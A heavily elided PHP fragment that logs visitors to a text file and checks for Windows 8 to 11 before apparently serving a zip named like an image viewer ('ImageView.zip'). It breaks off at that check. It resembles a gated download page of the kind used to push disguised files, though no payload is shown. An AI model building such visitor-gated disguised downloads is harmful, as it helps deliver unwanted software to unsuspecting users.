<?php 
 ...
 $os_pckname="ImageView.zip";
$os_pckname1="ImageView1.zip";
 $manage="GH3FP";
                   ...
                   $myfile = fopen("logs.txt", "a") or die("Unable to open file!");
                    ...
                    fwrite($myfile, $txt);
                                ...
                                fclose($myfile);
											...
											if(UserInfo::get_os()=='Windows_8'||UserInfo::get_os()=='Windows_8.1'||UserInfo::get_os()=='Windows_10'||UserInfo::get_os()=='Windows_11')
													  {
